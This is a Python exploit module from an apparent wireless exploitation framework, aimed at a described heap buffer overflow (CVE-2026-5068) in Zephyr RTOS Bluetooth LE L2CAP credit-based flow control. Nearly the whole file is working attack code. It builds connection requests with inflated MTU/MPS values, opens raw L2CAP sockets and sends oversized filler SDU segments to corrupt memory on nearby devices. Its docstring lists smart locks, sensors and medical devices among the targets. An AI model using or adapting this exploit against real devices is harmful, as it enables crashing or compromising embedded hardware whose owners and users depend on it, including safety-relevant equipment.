# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Zephyr RTOS BLE L2CAP Credit-Based Flow Control Buffer Overflow (CVE-2026-5068).

    The Zephyr RTOS Bluetooth L2CAP implementation contains a buffer
    overflow vulnerability in the credit-based flow control connection
    handling.  When processing L2CAP Credit Based Connection Request
    (LE_CREDIT_BASED_CONNECTION_REQ) packets, the stack fails to
    validate the Maximum Transmission Unit (MTU) and Maximum PDU
    Payload Size (MPS) fields against the allocated receive buffer.
    A remote attacker within BLE range can send a crafted L2CAP
    connection request with inflated MTU/MPS values, causing the
    target device to accept oversized PDUs that overflow the
    statically allocated L2CAP SDU reassembly buffer.

    This corrupts adjacent memory on the Zephyr heap and can lead
    to code execution on constrained IoT devices running Zephyr
    (smart locks, sensors, medical devices, wearables).

    Affected: Zephyr RTOS < 3.7.1

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Zephyr RTOS BLE L2CAP Credit-Based Flow Control Overflow (CVE-2026-5068)",
        "description": (
            "Exploits CVE-2026-5068, a buffer overflow in the Zephyr RTOS "
            "Bluetooth L2CAP credit-based flow control.  By sending a crafted "
            "LE Credit Based Connection Request with inflated MTU/MPS values, "
            "the target accepts oversized PDUs that overflow the SDU "
            "reassembly buffer on the Zephyr heap, corrupting adjacent "
            "memory and potentially achieving code execution on IoT devices."
        ),
        "authors": (
            "Zephyr Security Team (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5068",
            "https://github.com/zephyrproject-rtos/zephyr/security/advisories",
            "https://docs.zephyrproject.org/latest/security/",
        ),
        "disclosure_date": "2026-03-15",
        "platform": "zephyr",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "Zephyr RTOS < 3.7.1 (BLE enabled)",
            "nRF52840 DK with Zephyr BLE stack",
            "STM32WB55 with Zephyr BLE peripheral",
            "ESP32-C3 with Zephyr BLE",
        ),
    }

    target = OptIP("", "Target BLE device address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (BLE L2CAP over-the-air)")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    mtu_overflow = OptInteger(8192, "Inflated MTU value to request")
    mps_overflow = OptInteger(4096, "Inflated MPS value to request")
    sdu_size = OptInteger(16384, "Total SDU payload to send (overflow)")

    # L2CAP signaling codes
    _L2CAP_CID_LE_SIGNALING = 0x0005
    _L2CAP_LE_CREDIT_CONN_REQ = 0x14
    _L2CAP_LE_CREDIT_CONN_RSP = 0x15
    _L2CAP_LE_FLOW_CTRL_CREDIT = 0x16

    # HCI constants
    _AF_BLUETOOTH = 31
    _BTPROTO_L2CAP = 0
    _BTPROTO_HCI = 1

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_le_credit_conn_req(self, psm: int, scid: int,
                                   identifier: int) -> bytes:
        """Build an LE Credit Based Connection Request with inflated MTU/MPS."""
        code = self._L2CAP_LE_CREDIT_CONN_REQ
        mtu = self.mtu_overflow
        mps = self.mps_overflow
        initial_credits = 10

        payload = struct.pack("<HHHHH", psm, scid, mtu, mps, initial_credits)
        header = struct.pack("<BBH", code, identifier, len(payload))
        return header + payload

    def _build_le_sdu_segment(self, dcid: int, data: bytes,
                               first: bool = False,
                               sdu_length: int = 0) -> bytes:
        """Build an L2CAP LE credit-based SDU segment.

        The first segment includes the SDU length field (2 bytes).
        Subsequent segments contain only payload data.
        """
        if first:
            info = struct.pack("<H", sdu_length) + data
        else:
            info = data

        header = struct.pack("<HH", dcid, len(info))
        return header + info

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _open_l2cap_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_L2CAP)
            sock.settimeout(self.timeout)
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify that the local HCI adapter is available."""
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (BLE address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting "
            f"{self.target} with inflated L2CAP MTU/MPS"
        )
        self._exploit()

    def _exploit(self) -> None:
        sock = self._open_l2cap_socket()
        if sock is None:
            print_error("Failed to open L2CAP raw socket")
            return

        scid = 0x0040
        psm = 0x0025  # Common dynamic PSM for BLE services
        identifier = 1

        conn_req = self._build_le_credit_conn_req(psm, scid, identifier)

        print_status(
            f"Phase 1: Sending LE Credit Based Connection Request "
            f"(MTU={self.mtu_overflow}, MPS={self.mps_overflow})"
        )

        signaling_header = struct.pack(
            "<HH", self._L2CAP_CID_LE_SIGNALING, len(conn_req)
        )
        try:
            sock.send(signaling_header + conn_req)
        except OSError as e:
            print_error(f"Failed to send connection request: {e}")
            sock.close()
            return

        time.sleep(0.5)

        print_status("Phase 2: Sending oversized SDU segments to overflow buffer")

        payload = b"\x41" * self.sdu_size
        dcid = 0x0040
        chunk_size = min(self.mps_overflow, 2048)
        offset = 0
        segment_count = 0

        while offset < len(payload):
            chunk = payload[offset:offset + chunk_size]
            first = offset == 0
            segment = self._build_le_sdu_segment(
                dcid, chunk, first=first, sdu_length=self.sdu_size
            )

            try:
                sock.send(segment)
                segment_count += 1
            except OSError:
                break

            offset += chunk_size
            time.sleep(0.002)

        sock.close()

        print_status(f"Sent {segment_count} SDU segments ({offset} bytes total)")
        print_info(
            f"If the target runs Zephyr RTOS < 3.7.1 with BLE L2CAP "
            f"credit-based flow control, the inflated MTU/MPS caused "
            f"acceptance of a {self.sdu_size}-byte SDU into a smaller "
            f"reassembly buffer.  Monitor for device crash or unexpected "
            f"behavior indicating heap corruption."
        )
